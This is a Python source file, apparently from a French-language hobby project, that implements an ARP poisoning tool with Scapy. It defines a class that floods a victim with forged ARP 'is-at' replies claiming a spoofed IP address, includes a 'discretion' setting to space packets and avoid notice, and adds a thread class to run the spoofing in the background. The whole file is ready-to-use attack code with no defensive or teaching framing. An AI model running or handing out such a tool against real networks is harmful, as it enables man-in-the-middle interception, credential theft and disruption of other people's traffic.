"""
But    --> Fichier contenant les outils en rapport avec le protocole ARP
Auteur --> Aiglematth
"""
#Zone d'import des modules
from scapy.all import *
from colorama import Fore, Style
from threading import Thread
#############################
class ArpPoison():
    """
    Classe contenant tout les outils de spoof
    """
    def __init__(self, timeout=10, discretion=0.1):
        """
        Constructeur, peut prendre un timeout et un pourcentage de discretion
        """
        #############################
        self.discretionParDefaut = 50
        self.timeoutParDefaut = 10
        #############################
        self.discretion = discretion
        #############################
        self.type = "is-at"
        self.intertime = 0.1
        self.timeout = timeout
        self.countPacket = 0
        #############################
        self.blue = Fore.BLUE
        self.red = Fore.RED
        self.zeroColor = Style.RESET_ALL
        #############################
        self.getIntertime()
        self.getTimeout()
        self.getCountPacket()
        #############################

    def getIntertime(self):
        """
        Gère la définition d'un intertime cohérent si la personne renseigne mal ce champ
        """
        if self.discretion > 0 and self.discretion <= 100:
            self.intertime = 10 * (self.discretion / 100)
        else:
            self.intertime = 10 * (self.discretionParDefaut / 100)

    def getTimeout(self):
        """
        Gère la définition d'un timeout cohérent si la personne renseigne mal ce champ
        """
        if self.timeout <= 0:
            self.timeout = self.timeoutParDefaut
        else:
            pass

    def getCountPacket(self):
        """
        Gère la définition automatique d'un nombre de paquets en fonction d'un intertime et du timeout
        """
        self.countPacket = self.timeout // self.intertime

    def spoof(self, victime, usurpe, boucle=1, intertime=1, countPacket=None):
        """
        Première méthode de spoof, la plus basique...
        """
        paquet = ARP(pdst=victime, psrc=usurpe, op=self.type)
        send(paquet, loop=boucle, inter=intertime, count=countPacket)

    def autoSpoof(self, victime, usurpe):
        """
        Méthode de spoof automatique grâce à un timeout fourni dans le constructeur, ainsi qu'un niveau de discretion...
        """
        self.spoof(victime, usurpe, intertime=self.intertime, countPacket=self.countPacket)

class ThreadEnvoi(Thread):
    """
    Thread d'envoi des paquets
    """
    def __init__(self, objet, victime, usurpe):
        """
        Constructeur
        """
        Thread.__init__(self)
        self.objet = objet
        self.victime = victime
        self.usurpe = usurpe

    def run(self):
        """
        Surcharge de la méthode run
        """
        self.objet.autoSpoof(self.victime, self.usurpe)

if __name__ == "__main__":
    pass
